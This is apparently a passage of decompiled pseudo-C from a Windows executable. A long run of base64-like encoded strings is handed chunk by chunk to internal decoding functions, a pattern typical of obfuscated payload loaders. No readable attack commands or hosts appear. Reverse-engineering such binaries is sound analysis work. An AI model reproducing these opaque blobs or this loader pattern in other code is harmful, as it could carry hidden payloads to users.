\"vSZf5GwdH79EJTf4rKkv1JGv1PtscqK5h1a5EGTsGCxYJLJpdORYxafhIXwluZHijEGLIYes+Tv66JHpEJ8gBKcEUffsJRmUIb/Us0pqrGvH0AP/gd8QJqNUaPmLo2hxy+BQkd+8qd/Ma1TTfmvuieBYZuZvaRT3wmb4YeSo09/s9yYMsEoh4Igz2Lny5JXt55WnvPccUMK6Ixegk7ek+4CS96gA4cf3hW135Oyfp7yMZyf0rNu60pMu7DO77jU7h2SlsLWsFxpgKUAGixseO+vs0dVc9yYcj0oh4IjvjzTyfpSs5M8A8TOs1bS1IR/UKwCY+paT/9CzrwzDvSZf5GwdH79EJTf4rCsf1FB778yAa1JrzRS7SKXeWKNSiNVYihun9qsW2JB4uJADx1yzIVsCMef9JV/oZ+ToimpvF4Cf52zjoHLXwAAZT6e4IVf4vS9f6Byfn7x8l7qLV6fa81cHb9fWQzsF1SNr5uInwRN0HOD4I45QPRe615CornhcHhiwivjjz9q8+vBkchzgknK94Lejr18d1ohjIzAQuOiAab44tawYxsSVZnR05Fg9J5rIkKiSldh3DQweyOALRoZ+XicvSor3HMRZsKRAMmhXB8bih3KQa15r81jpVOdTb1eke7DYi1at2xAd6foZy8ybSOj6/rP7hZdTmJcUars8bFlP55iZ++DwE8vM4DObzOhLUuryQ2+xlwx7mOgL5i9Za0v/ux02+oqw4GFbObC1L+OtkRbvTmtlk7ClqFjXXjuRhwxEseCI746nuhpXruuqp/n3I1tx\"\n    ;\n    puStack312 = &stack0xfffffee4;\n    puStack316 = &stack0xffffff00;\n    pcStack320 = 0x406312;\n    puStack316 = fcn.00401091();\n    pcStack308 = 0xffffffff;\n    puStack312 = NULL;\n    pcStack320 = 0x406322;\n    fcn.004011db();\n    if (0xf < puStack244) {\n        pcStack320 = puStack264;\n        puStack324 = 0x406332;\n        fcn.0040b0dd();\n    }\n    pcStack320 = \n    \"RaBTWCGtbIc/HOWgXKA4OfhYk+KgE1ZsRPbXsKSn7xTuqhiIiMtQ6c6otbSkJV7oZ+ToimpvFoCf5mzjoHLWwAAZT6a4IVb4vS9e6Byfnrx8l7o74VTT3uz3Jhh4wPDgA+StQGzsGI+h4DMYfaIQPaCi0dbse2iA+gY7rrjbdoTGpJLqrJThBzLUmd7soNvW7AAT9swQwwIDpcyNta4YrJcM7078pIrwpKfuEOgu0IhjCXEIgO+OOHV9WKzrqmCIrKRYvxI8aaI4+JABzeA5rXRrfUw+4lyjU5imav7kWGNEoR7YJfyBAc5cMxiAkiY7+5wj4tBv6HIyrNCxW+5oUcawmAvOXEhj9qQww1cnTVRvUqRzcHGoaeSoe9VcK3CBzlA95JlpfvQ2VBDegZeuyE+qbMOsIh7YIPlvzrjZ3qiAY370TS9m6OxvAhMx6+634yMW1KdOBLial7Dgh1e89uckGKw3/Om+PGlcoS3uHBNQ8OKWA1aA28bUS7g/6lAk5eOmyLWKELgn7hxoK4bUgPv6YQuznhC/N5DmUxsTVm5mdFiwL+Ycnx9+wgKIGGMAgaZwPbG9keqgnxjwBvrT/pSTFqTb8BrOwJCxH87Q+d79pJvqoORjhjDsK1Iv7mir7szPk0hGRzjTa93tdvqTXWHOlP+c/aVPW0NdeEkPb3cD1u4JMB3HT+An9C8IDLOu/xXTavObpxn1CBn1fO/26IjgMLDBvJPq+DemuE+ifMehm4rSQ/obX7EmxfsDpkQ7OyAYrOSX4NO12ZT8pagqlyO+5ItJ87Zt\"\n    ;\n    puStack324 = &stack0xfffffed8;\n    puStack328 = &stack0xfffffef4;\n    pcStack332 = 0x406349;\n    puStack328 = fcn.00401091();\n    pcStack320 = 0xffffffff;\n    puStack324 = NULL;\n    pcStack332 = 0x406359;\n    fcn.004011db();\n    if (0xf < puStack256) {\n        pcStack332 = puStack276;\n        puStack336 = 0x406369;\n        fcn.0040b0dd();\n    }\n    pcStack332 = \n    \"DpKqs7UmVpRtWtBxMRxdDOipWBnuzBvOpJHOuAGeZNq9fjCfJEPZhkzrzHCN7nBn7vCQmIgYxIoLnlywwMiT4qB2mKCnBFH27CUZmCG+1LNPaq1rxtAD/oHfECaiVGj5i6JoccrgUBPuvGix9lzDAwOufIN17MtM7VqodTXs0fbgk5/itXPeuLNWhJOAan74Pa3n6tTdjrB8Zx70XJEm1NsbG8bMK3Bjc+Q3JHV/+KWiVG25dW0e9J9vKo0jtqCzxizD6AKmcDi0U16cJXKo8PeiHEid1hzjS3PWwANmgGvWpLH1SSnKo2H54Ph0Ex64pKhckN3+E/a0KMPjuzJ6O3tEl1Ib42OGSOTTYNCn096Y01/Js1aM7wtYOLC1KcrZ8JetBDZtFvgvZtHumHHOzGB4Th93ijrrPunoKSQTZLl25Fg76uwylPfDV4cNibHgiGXxxJmf2GuiWOj4dOSLUK3uEBvmyKvGvGu4as6osLFK6ihtilToezKgoDPa7FDjSg/WgIgIsOCHZM6xtayT+vyXrrz/JplYvHu4me6wHcmAkfakCxgwwqsnVpzfUtSLfG4e+Cypp9aYOf7AgJv2pHBjRvS93/ptBhSvjbAN6rGkqNPFXHPWlKNe8NvOxDc3jFPnU9fcaYZEb5NjRKMdbMLwGc7AlfPi12l+9I5rarFvUtDDOtAruC7uEBipB9a4SXb46AumfEiM0lzfB5euvPEtLJeXaNHu7Ctwgc5QO66423aExqSS6qyU4Qcy1Jne7KDb1uwAqfbMa1OKiruzYz7iXKNTWtwr\"\n    ;\n    puStack336 = &stack0xfffffecc;\n    puStack340 = &stack0xfffffee8;\n    pcStack344 = 0x406380;\n    puStack340 = fcn.00401091();\n    pcStack332 = 0xffffffff;\n    puStack336 = NULL;\n    pcStack344 = 0x406390;\n    fcn.004011db();\n    if (0xf < puStack268) {\n        pcStack344 = puStack288;\n        puStack348 = 0x4063a0;\n        fcn.0040b0dd();\n    }\n    pcStack344 = \n    \"lO0e+CnpSBnuvKtP+gU7rrjbdoTGpJLqrJThBzLUmd7soNvW7ACp9sxrU2H+3MdPtaxS2ScltsR7YvpOW1fT1uhz3syL2pUf9+A4vwMoKDzkHOArlO0e+CnpUBnuvKtP+gU7rrjbdoTGpJLqrJThBzLUmd7soNvW7ACp9sxrU6KztgTCDEVOUhvj0zhHNotQre4QHen7Gc7Mm0jo+v6z/oWXVpiXFGq+PGxZT+KYmf7g8BPOzOAznszoS1I+4lwpLWjMy7QjHvSsqFiQexiZzsCT/tCzrgzDvSZe5GwdH75EJTb4rCse1FB77syAa1JrxqQ3B3d/+KWiVG25ZG0e9CdQUOK2c964s1aEk4Bqfvg9refq1N2OsHxnHvRcKybUoItyCXrnT+CIq01z3ewarOQvO3XydtmwpPsIb71EbsiIcvBtDjK7sLX/SFPxoB64dGnewzaoWFfuwJiIiBg5pqBj/Kg4Kmo+5BxpvlhvHoyl7hhv7pwbzXCR7twDvgibbdhsL9oclNL/oiA7KixYkKjT3vgBED1m+nI7sEraHP+04/Z7sOjdcNHl21hXcdbkY1A9dvpyO7CObm2Zb1qcc/poWLCkI2Ab7oy7cbPHv6Jz4/nn5/znuZDioPh1WtSwpKjbVKTTT/yGkc64Ab5kW7OthiDkHOBzMrgH7v8jvc1rrRtkC/SQs963s0o+fZPh8JcXeZIbJ7CkISVsIa10A4GbScABrdCrdSdcLvSVpRT54E49PDhYkKhx1XgFHIHvP2QoP7WsGCWh5O9Pd20dUJ3lVJ8ubZGI\"\n    ;\n    puStack348 = &stack0xfffffec0;\n    puStack352 = &stack0xfffffedc;\n    pcStack356 = 0x4063b7;\n    puStack352 = fcn.00401091();\n    pcStack344 = 0xffffffff;\n    puStack348 = NULL;\n    pcStack356 = 0x4063c7;\n    fcn.004011db();\n    if (0xf < puStack280) {\n        pcStack356 = puStack300;\n        puStack360 = 0x4063d7;\n        fcn.0040b0dd();\n    }\n    pcStack356 = \n    \"iPOza/Ucx/1Zo5wr5Rzg98NQKsI2qVgVXvcU/4kYsGtPy/6/AnSR8RAnvfB7YzyxpKjT1VB1rJkJ/k+fiOBeiTGbl6zkHJSNe1PswtY6WZAtDp8Mthmw4AOlxJtzo690bUEUwynsVzeOqViQI71oCW7nz+CIhgE0giMYrORo3vfDUCrCNqlYFV73FI+JGLBrzRwTdrobwCW56NulfOvfQ6SoWBvtABFud2ew4O7ZvIc6rBisb2Ec9/Gtp09bLYOfLCmQiIiT9QAFWqiwtawbUoIl5/fxzqdPWyMVYMLYEUkYGLDg0mP5sjZrGspvHYbDc5F1M2Wq21eqnhuJ7iO3lZdj+bI2axrKbx2Gw3ORSTNlqttXqp4bie4jt5WLqk11MH5s8G9ZEHOlbwVEoThYkKjTQAKJK3kxcto/O8hQFzglkeSp/6mwO/FMY1GnfiR2d+c7rZjZfbw8tZNk616t9P+hTDnpQNGYk7Wc/KGT9RCHV7y4OqwYrG1ZGBHyGqdPL+1IG+XsGZAwGrHgiNl9vLruXaBtHb+mL2+97Wf903wrFKzb3pNBtwGV9DvzsJP6wJee0P+qdDv6iNHVWHPWtAFdWGvO2LH1QSddXMHjn/h0bQ1ULdWgGeUUGc1UkzZoiOA4NXXZDJVinOD4dOvcZaeoWBVz9xRFixiwa80Qsw49rBis59/FBwvkWDnhfOCQuPiQo0sjSO/KJxNIPOnIrzyVXnB05Fg72VDRzXB9UPzzk800AziAsDWsGCcvNyfDt+saeCkvyJCo+MF3Ppyw4Ijj/jn4eEhT\"\n    ;\n    puStack360 = &stack0xfffffeb4;\n    puStack364 = &stack0xfffffed0;\n    pcStack368 = 0x4063ee;\n    puStack364 = fcn.00401091();\n    pcStack356 = 0xffffffff;\n    puStack360 = NULL;\n    pcStack368 = 0x4063fe;\n    fcn.004011db();\n    if (0xf < puStack292) {\n        pcStack368 = puStack312;\n        puStack372 = 0x40640e;\n        fcn.0040b0dd();\n    }\n    pcStack368 = \n    \"8WgeuHRcWbGkqNtUpMNo+6ozd9nNNDfy8HhIU1KY4Ph0ad4gJKhYk2+ob5385vDgCyQ0O/B4G1TlmmT4dOTZV1vXWJCDIOUeA2VIa9U4s/1ZJ01IXBxg+HTPm4tmpxpAK0YQiIgYsGndBE28NFcYvOQc73qM5liwJ1NcnyrbkoiIlTaKGuE4OfBoK2xvURC4/aGAO+F0XQCo+JCLTpH1MAPgHU9KUxglocghEGXXHWSBV1eQqPcnNM5qIuKIhrE8896KruSXIXM5CHN3qx+YGdUwG/VwkfUAsyI3N7itGKxvSSh5lhsnsKQpmgCo+JCLXpOyxXcfx7CO6cyjYfDg+HRvFWDOiAcTafoTSop+O+Hu2zrFmC/Zrmfe4p7/5T6Lpt1HE2n6E0qKfjvh7ts6xaQv2a5n3uKe/+U+i6bdW9/dPRqJAU1oa1lrTWiGZTP5NM0awnJvLXyrPJkVV3PtcAUc4WvFAE27Pm3vdP/cxfp15FgzXKsq+t3wEXGIOLDg+4ADcz5/UaOmzIZxO+XR/UQjFXwhrUgFyuU45wsnOzq0fPCgZJThczEEfU+lqFifHnDQWsgYO6VoIdC4NNH4rOYc4PfCZJhh5KhX0mlz3WTu5zSmWmM4sLobHPneyKD4n/3T/UibitIhrUhji5PlOAOl7Diy68iF66ognotgHiIlqFhv5QwZ9XBtoGtHJ31EvawYrKOVrRT9maA74UzmkCj4kInd8LMiibXIi3MnzieRwO+6pOctaI/1gBFOB++IiJHFPAOV9DngSCPRIGqsczEU0fa4Ix14\"\n    ;\n    puStack372 = &stack0xfffffea8;\n    puStack376 = &stack0xfffffec4;\n    pcStack380 = 0x406425;\n    puStack376 = fcn.00401091();\n    pcStack368 = 0xffffffff;\n    puStack372 = NULL;\n    pcStack380 = 0x406435;\n    fcn.004011db();\n    if (0xf < puStack304) {\n        pcStack380 = puStack324;\n        puStack384 = 0x406445;\n        fcn.0040b0dd();\n    }\n    pcStack380 = \n    \"Ia60u1qR9twDpcw5+4CTYm1CwHEKzNH2nEBqZlcHG0AN0b9lm+E4sD7qJCeaNGu2WG8NVC3tsBvuwBn1cJH9DAGlzDNOqBcvAuEfB/E/VzR9VKdvI71kA8XET6VgarS+JawYrGwTp3A5G9P9SCElaHjR2AHN7MXwAy//9UGkGKzkW2m1mG0lSKseHW/OBxTOGpmw4AWiOU/wXKKsZBzgw7brGmAv7YTQIa10rXdnsODDaX1sOCpyPuUc2wACrtP1VCEejCO9eAHePIMyAaYEO/BYkeLIly5xKsTRzowhHqhAk2V3d5N4ZUGVaDvzkJPSzJeu1P+xvDnhQNPWkHHtcAFVXGnNFNOzPunsKT8TZbyLG6dZsVSnbyO9YAHOBDulYGl+jD7p7CWiJNM4/bp48C3+fBnW0BnGpPO300hl8b8sbEfyv5cFpbdvGZhb6WQYuHPRpHdZmDCgH3GIwL2T7cyVodQ0IxmIrKhYkCG5uIc+2tYfDKGqMbWs2/lv8LGr/yYOO1UhHWwloG2JziQ7pqBoIDvzhJPx7FdrK/y8WTvigJl6oHDAigNWnGPOyDs6tHzwoGSU4Qc63C2hL+5wGe7U0E/OILjgiOCx9p0n2y8GY8UHdeRYMV+oWpCo9yYAyMrw4IdWunBk7Bijpt2GB/CiijOkqNPVVHtoi/oIv1eMpQJk9ax+U2Bacnl05AbrL00FU/1zfAtkOOO232vBOyIoGKzkl1dwdORYOyMoWJCoccV8AW1Iac0M07M++ewpEmnxfbTr3BenqFip39ifDBYbsOADpxw7\"\n    ;\n    puStack384 = &stack0xfffffe9c;\n    puStack388 = &stack0xfffffeb8;\n    pcStack392 = 0x40645c;\n    puStack388 = fcn.00401091();\n    pcStack380 = 0xffffffff;\n    puStack384 = NULL;\n    pcStack392 = 0x40646c;\n    fcn.004011db();\n    if (0xf < puStack316) {\n        pcStack392 = puStack336;\n        puStack396 = 0x40647c;\n        fcn.0040b0dd();\n    }\n    pcStack392 = \n    \"+owbbWfk4vf241qwpCMfjKs5G3gJ/k+fiOC16Esn24kbY+D4e1LMiDSoWJAlu5Gtd2ew4EkCPb8DKCA85Bzgy6RcWrGkqHNRI7Vksc3gv6LNGBH1Ta/Qr6M8abWcbR+QT+fSkelx3XwAnIdwiOA4MUutGazkb+dw8NrIMKSomXKtc1uHPtiDMDAfR7C1j8iPLFphHoubWLDCI9zH2mqSiO6RNK/6cjmw0yWE+5aO4vg3bxVEn+Ww5QFz5XADT5BYiGA4sD7jPIcmJyH3NizbzUio0d+MjZwJchqx4IjvugS3rBgnowDTI027CNqm9lfV36i1d/cYsBfP6DiwvKzf6Qwd4Ph0bQVULd24Ge0InwyZGbDgDSmzeLooP63kHBe/fORYuKSn3Yqp+JAFyeeDFq0fR7C1JpyUdBzg+PyhpzV2p9xKqPiQBYwhOq132LSAJawYrJEZpsOGlqo76Vjbbqv3EjKIGLDTU6PRZrWsGC2bPOL5dORXM+RXp28jv4yLzzg6+q0fR7C17lYlsehpjYxsxIg0qFiQlfmRiIhrt2gU2Kgwtazn68SXp9z/q3izZSugk9qmG/+Um3EdixE3BnYnzi0G45/4dOvuPJ44WJCoOXGCu9A9ponFx8+1rJlNG2Pg+HtS3Ig0qFiQjQeTiIjZUOW7KF47MeNqPuYchnHwsyoipajTxVyeGTzHaiLiiGtNSDBaFym34x8HnX+mT1ubrnuFddVo2JX1BNiys+ep/ZNjDHQWB4tvBVQnbEgb3RgbxXibTuP96LlLtYwYrJcO2zMA6q/3\"\n    ;\n    puStack396 = &stack0xfffffe90;\n    puStack400 = &stack0xfffffeac;\n    pcStack404 = 0x406493;\n    puStack400 = fcn.00401091();\n    pcStack392 = 0xffffffff;\n    puStack396 = NULL;\n    pcStack404 = 0x4064a3;\n    fcn.004011db();\n    if (0xf < puStack328) {\n        pcStack404 = puStack348;\n        puStack408 = 0x4064b3;\n        fcn.0040b0dd();\n    }\n    pcStack404 = \n    \"rKhYkqiMmQt2HcfkuxYLaz77SCk2aNxzu9+qxociD8RAjGx3d5lOYIjgOMK7/5N6DIocB4tnP+CkQyMb7Qh70Xdv/AgLHMdP7CdX/K2fh6h0Dz41f91HK6h5kIiz0zsjh6L5O3omjJR0HOD4nMykT1sjFXhDuxP3nBjF0H+nMLC1rRjZw50eeHTkWMO7ElgRqPirQgPav6JJ7440jTwYrOSVp6z9uxQ50/izVftzRgNH8KUcdx9hO3utV7BfHGD4dM0XkC/vfJNpc1uzSxfyKAVnUiK0rJHjwJev0E8sL4Yl12SQ1PiQA/3gO6Vk774pSVPnhyudCYrm5FjbZduZeK/D17T7CEengOA4uLUnXUDrmJYEixvT9VCbihvdABtHAZ804IjgsQc9rBisDHMQB4tvkDVt3UQb7RR5xXTnT2vdFAtwPDucrOQcaU/85Fiw5ENfo2h9WYcR2O++02vd7Xb7k1VvU5h9vZBTOyMsWJCo09f4ARk7p/Rl+MT9JxiHY5Dg+HSy08f4k56f6ggbz9AdwnKL4Dt34/yT65AfZ3R05FjgW70sbuj4kf/Qm3TsoZdkO/LQGRtoHOD4/2vUsKSoBhmgy1Cxz3jE5rGnZMW07EdvsZcMqSeyDztVm6cbcn1m/ZKT9egNIEyyPJST6fSZIIx2bWDaWvCxHqn4kAPFEDulhGttoDzyaCWqZGm+AG0OzC023JCo+BVB/Bw74WPis3c8KpCs5BxrvWBt5jykqFgZLniQiIghzez957HNSSnK2OPbpQR15Fiwl2hhrqdtULPN5L9k\"\n    ;\n    puStack408 = &stack0xfffffe84;\n    puStack412 = &stack0xfffffea0;\n    pcStack416 = 0x4064ca;\n    puStack412 = fcn.00401091();\n    pcStack404 = 0xffffffff;\n    puStack408 = NULL;\n    pcStack416 = 0x4064da;\n    fcn.004011db();\n    if (0xf < puStack340) {\n        pcStack416 = puStack360;\n        puStack420 = 0x4064ea;\n        fcn.0040b0dd();\n    }\n    pcStack416 = \n    \"l+E4sIzSdKNhCuH4dG8dpJ3WMOShe2iMh5214YjgvXnBoCGVkBRlI3tgrbCkqN1C3PWpsvwRiZ2E77xUtawYny2fGPx7cJk7ZSEVbKG++LH2RL9lSuA4sIzSeKNhpeD4dG8euIFXV5Coe2iJ/T1HpoDgeLC12ARbohTg+H/kLaMvZrDOXQdvDUhtoWvOjNEStawYJyr0kgKLG7NbU+5QkJj4kPyTnWuUn2u+NLWsGCc3l67gXycIWMRzp2/xcdaQA0WkZVOUa4nLjG3i3aJo+HTkLfad1gTl6XNDA0bw1g53H71wzQmT6RiVppj3H1vFjRNYkKn4HQ76irLg27doT6AQ5uzkT21+BnZZsPP4p4UUBtCIC9yoafbEs35dROVTG/fvfb2QWjmdLYrkqnGq4nZAOabkv2brPklFb7GXDKsis9PNqCOpG2/LS613F7DgCyA6Kd+vQVsdlZ7wNG1GOfqs0dakc1dJYBYzAIlpfqQ+a9lU5jkf+3Tk23CmMa9p6HHWmAn/sGCI4E2m3awYreSRZorm5ljj9FdNLFa4kAtMFDm+zG2+wyesGCWiNG1+BnZYsC3udB0uigKLiJHuoAG+BDnriJHyxJW+5P26MDn64NHOzHHO6AFG7GnWuP/2jaQYrOSVpsj9omw5+sTRzvxxztgBRvwnzvg5sLWskfKUlb6M/bogOfrU0Q4o+JCIAYY04IjgsS49rBisbYJs+HTk3U/RvjCRKfiQBQ6IsOCIs2hPoBDm7OSfJPQcpFqwpCXeAin4kNvY56VcdqA42vUhnn5nHOCr\"\n    ;\n    puStack420 = &stack0xfffffe78;\n    puStack424 = &stack0xfffffe94;\n    pcStack428 = 0x406501;\n    puStack424 = fcn.00401091();\n    pcStack416 = 0xffffffff;\n    puStack420 = NULL;\n    pcStack428 = 0x406511;\n    fcn.004011db();\n    if (0xf < puStack352) {\n        pcStack428 = puStack372;\n        puStack432 = 0x406521;\n        fcn.0040b0dd();\n    }\n    pcStack428 = \n    \"JBtNDFroWBNs4KNI10brvUtreah2FJj85Bwjrf8I2Vx0qFiQI72Y296TQmndFLOwNmfnryKVlUD/kUg54UjT1byvG3EBRUBp9SSzsDzZ/CHoLGm1vG8VqCdJXBnlKOSPA9M5vUgLM5vwoJXiGx8ocTkk1fGlLZmfLeyDiIgjxeyHYjOjtayT69yfhRB0by+0L+d8Ge0EG8+okfU4A6cQOfBgk+vYlaVE/+PRxXAhFWhvvXyJiBiwJ81UqLC1rJtU/BNnsnXkWL8g1lKQqHtogoefTeCI4Dc0H6MYrGfk6ffz0kmwpFd8Fcim0IgDXVhrQGl/vD5ckevslaU0/aGgOeFw09VEcd10AV+sac/wvPWto5yu5hzgczkE03KfaSqaI718AY/xefCI4DcGte6R6+z343M5BGNh1r8ykvB81ZDi5Ovvzb3UObInXUANsPD4dOvusuYjF5ghvXgBzxQ7IUkAMLPwRJH5EC8yPzE4R7CkqK/ldH1C/Z3u9QiolTc7dIgXkOxp53MhCGtwT63TxURzUgv1yLBpzRhNl3RFHC8lFDMa9R5YMKSoL58jtVDJ4ufr20KSPIN8RxsnqfDrOf2hoDvxXN1Qp30UiIgYWcKJ4DgzXacXKL8e4Pj3DFu/IKBakKiw2IcMmLXgiKg3NLmiGKysE2TIcuRYM0yrVxSw9pCIwFC/ZD3oOLBcVBes5J8Y3QOuVzTvpliQKxCJhwxtueCIqDc0jKYYrKwTZCF+5FgzTK1XFAT2kIjAUL9kEe84sP2jnDDpHOCwe2Hvv6So0c1YP5es\"\n    ;\n    puStack432 = &stack0xfffffe6c;\n    puStack436 = &stack0xfffffe88;\n    pcStack440 = 0x406538;\n    puStack436 = fcn.00401091();\n    pcStack428 = 0xffffffff;\n    puStack432 = NULL;\n    pcStack440 = 0x406548;\n    fcn.004011db();\n    if (0xf < puStack364) {\n        pcStack440 = puStack384;\n        puStack444 = 0x406558;\n        fcn.0040b0dd();\n    }\n    pcStack440 = \n    \"iBiwCSHvOLA2RD7Y1lTvfBHqWLDs4FcUq/eQiMAXNM+H4DgzXaUXKCEQ4Pg869xLqKhY2Kd8Y4KIGFlkh+A4O/hIk+ksJ7UYe2ccv6So0+VQ01EDxfibKrMhN/J9l9ajpu22qouRvE+x3KbQqHPFfAvcvGvFBDtmPungryo3JnEhENPFcCEVdCG9aA1IFzVchOA4RvK4GaNh9u34dG8VTE+3Y8VI9xNIhBiw7z7is35mTFonqeDrMP2xrDnpVNtWoHtui/rEOyELDjszVavZReeVp+ylDNH9WCEtRCG/iIcMLrvgiGPAs7ooWKHkHNu9mJE82oTwCBnvyB3/yJU3AIXgOHfygDit5ByK/SQbTQxa6Fgb1UzH4oBOWJD14Djaxa/vxu1KCJwJ5FgzYIzV7thAl4+PH9rm0ROTO8hooKTsFOhx8mxYsKQh3hyo+JAD/cxZE4jgOIN8JVVUZ+Xj9/ZzWLCkwHiRqPgdDwgDsODi4GhPoBDm7OSXtQT3IFSDZCEdaJO/pIcLrrDgiGPGs8aEk/kQJ7UYe2e7u6SoVyaqc15baFq5pXRj/rg8+ewvGh+SGf+hoDvxVFcmKMxKyIiTemNp5/lati/2r21JHHEBMNA8nChDkKhz1XDI8xLb3QA3MzunGKzrquJzuje48q3tpBNu8BvFcJHlFIdeuaRl7BglofTbCAYx0/VIJUwfI7V4W2hQk6V0aXqcPungo1qU9Cg05IvdWIOpG2Bx5VwDHD2oUqA4sfeAWSex6Anuixund+OcS5Co+BvPkJ1w7wDdPLC1xdgM\"\n    ;\n    puStack444 = &stack0xfffffe60;\n    puStack448 = &stack0xfffffe7c;\n    pcStack452 = 0x40656f;\n    puStack448 = fcn.00401091();\n    pcStack440 = 0xffffffff;\n    puStack444 = NULL;\n    pcStack452 = 0x40657f;\n    fcn.004011db();\n    if (0xf < puStack376) {\n        pcStack452 = puStack396;\n        puStack456 = 0x40658f;\n        fcn.0040b0dd();\n    }\n    pcStack452 = \n    \"6RzgkjSOWDNk6FtXIb1gBQ0oTx93sMelCVJYrG9ZEJB07FiwoYhZkKiSkNh3DQweyOCz9UXEmKjkHOXYfeRY2qT4p4UUBtCIA0+o00Fj/JSM4I+AkgRrpYTr7rS9V9wVmAdvd8kj/HekktYzflObyQwc0zFVaSxPW1d5HdgHb3fiHOprDPUIT0pTG2TlWQj7vW3UpdBXp28rOpQLciTGAwkZOLC0rGygb1kMwTEMVzckoliQI7+IC+3IsGnVPLvMMoAYo2Ik4fh0by1gL+2oo3r3JoSOkf0wDSk3NLitGKxvgG2IixunOelA1dOpcRQF+OdPHwOl0Dt+j1VA587rKaUPEDnhQN1Q3RIbxVibSer/prNxdEwRpyITVzj9oYgxXqhckKj3E0qIGLBr1Qyz9UUnZXw3/238JOF4saSo1Zyznhmwi8uzIQkaOLS1rGpdb2EkEeHkWLAv9agbat1vi4gYv18UoxixtayR8QyZO41ubyVAL/WEGfUQ9gEUX5DhiOC7W7cnZWhtQTw5nu3bSa/eHxvVFB3RfZP9CFkKs3KWazNkXJPk+HTPmTvpWFcnpLn2DUFtp2v1ELP9acqRoKOXIXMJCNtYpiEdTEP7nzdBU8UoA538OfhEk+kUzQrbIQhz5UzO0ST45pmIiJP3+M7bTDeZo5p9GuMfcwEw23tbKyeIqvcVr4oYsNNBa3+Atus0Jank2zB7Z4yxpKjTxVx7bof7KDulaMv6M02uFyFSHOD4/6GklVurWJCnRxTPKASw4AGl5DV11CJtHBVlOACPY0DWz9Pd\"\n    ;\n    puStack456 = &stack0xfffffe54;\n    puStack460 = &stack0xfffffe70;\n    pcStack464 = 0x4065a6;\n    puStack460 = fcn.00401091();\n    pcStack452 = 0xffffffff;\n    puStack456 = NULL;\n    pcStack464 = 0x4065b6;\n    fcn.004011db();\n    if (0xf < puStack388) {\n        pcStack464 = puStack408;\n        puStack468 = 0x4065c6;\n        fcn.0040b0dd();\n    }\n    pcStack464 = \n    \"VHNRrXcbsOCHX7z3FbAYrG1ZOH2069AVpKhYG2A5aYGt57HgiGl9aFwYGKzknx7yAtcyuv0hFXgjvWxbYDv1DAOt5Edkr9mjW5CnWFDkWDvhQBgZ5SQZzWCdeZkpa3VY9Zfo3zcntRh7Zye4pKhXJqpzXltoWjutdGP+uL5kkfkQla0E9xpXvybnp29XEf93d+e/Vtrhtf69J11YN/5rNntSWGNEIxVsoyibQgNNRGNK4rH9SSVNWGfa8BE1G6dPzqIBG+0EZ91Qy1hjaOE79W3tFxNgW0DcdOTR9XwtmOhKc9V0o+ljCAOt4DnwUJHZMJ8Z6Af30/1cIx1IIHyprKEYsKFhTMZPStkSL5nk4PfwB1+wpKfmGago0IgBVXzbeZMci+BMFy8+G+D4e1JaO2p7uNKhvWwLThA7rURpbUSOXWpzb1kccyEIc0F3ShIZ3SyzWFvwO61QaX1MuhKZpDRc4Pukbx1ILf2IE1Ho5YKHrjzYq8k4sF6uK2W2GcTRdOQJs2P4p4UUBtCIA1VIY0zsO/1lRQNSG+Nrv0TnH5yfaVcVwf+QiHdvnG0PxBGwtfyV66RMH+0AGhiwL+90b9/IlayhGLDjT7C1N1WhGKy04/WMiqRYM2Cwp9+wEShzd+c7tXxrdVCeZptV4BNs13XkWDvhYHPVTJJv0wvgsu8E/TmwtS/mo5c1704m5dN+L+2sUUrwnz6IE2BrzRzrUr5uk/kQnyL6/aGkOfFc21a4E5MDzeSVH4vgOL8KKF/M5RzgcTEc3XDcr9NYaQGZY6lyurkDpcRH\"\n    ;\n    puStack468 = &stack0xfffffe48;\n    puStack472 = &stack0xfffffe64;\n    pcStack476 = 0x4065dd;\n    puStack472 = fcn.00401091();\n    pcStack464 = 0xffffffff;\n    puStack468 = NULL;\n    pcStack476 = 0x4065ed;\n    fcn.004011db();\n    if (0xf < puStack400) {\n        pcStack476 = puStack420;\n        puStack480 = 0x4065fd;\n        fcn.0040b0dd();\n    }\n    pcStack476 = \n    \"4FTLRGf84fsxHBm/Gywf8KH4kAHN4DUg8ALr3UmH6QXkHeD4e2GGsaSo226ni7mHPkqxa0ZrfUR0ThCjUhzrKP+hpGNGo5ob/QwTSoqR9RwBtcwzc7zzr29ZHN2L51iwqxfc18j5kIgBXVhlSJg/O31t4aUPN4ryLW0VbC/tpENA29VkA1VYF1nj+Tv4cFklqcDvR/CjOLmkqNHVQH1Q8FOT7QSjEevdSSdVVI7jaPMvTVixpKhXFeH5kIgDVVRoyeG7cbdFK63kHGMGe5dzM12qVx0e+JCIA11MxXfjOLC6E5zrhB3g+P2hhDVk0GJRUPEVSPxzixD6h7P9SSfZiRsf4Ph7W9z3xKlYkCG9aA1IFzhFiOA4O31t4aXB4+H4dG0dSE0cWJCoe26C/iva6tFpdVg+6eR/DD+lFP+phEd1q5mfF3TX6IEYsGvNCHg5+HCR6QyZKYHVbxVY5JOo43vDxWiHm9DliOA3Brcn1n8EXmu1iGeeuK9g0cVccd10C+a/7wqvx09KRXdTG+PvTibl1f6sIx1kexobRoeusDNoa3VMvnwTZm9JFHu25tH9WCENZCs+gGHJ508f4uphO/BQ7/kczwh7lOVb9VzpVy8sv/CBiBg5pXBl+MhXf3VQz+3d+HXkWMO7Q1sb7QAbxWwj/SiHY+O0tayQraWVrRydbKVPW1cddI0HkYiIkfUYteA5sLWjnNwT4x91cGGkS1tX0xiIKNCIA5joOsjgsf15JV1UYdWUzJ/5Y+VEp9szrPiQhz4aOy5bAHq58FCbauyXrTT9sayL\"\n    ;\n    puStack480 = &stack0xfffffe3c;\n    puStack484 = &stack0xfffffe58;\n    pcStack488 = 0x406614;\n    puStack484 = fcn.00401091();\n    pcStack476 = 0xffffffff;\n    puStack480 = NULL;\n    pcStack488 = 0x406624;\n    fcn.004011db();\n    if (0xf < puStack412) {\n        pcStack488 = puStack432;\n        puStack492 = 0x406634;\n        fcn.0040b0dd();\n    }\n    pcStack488 = \n    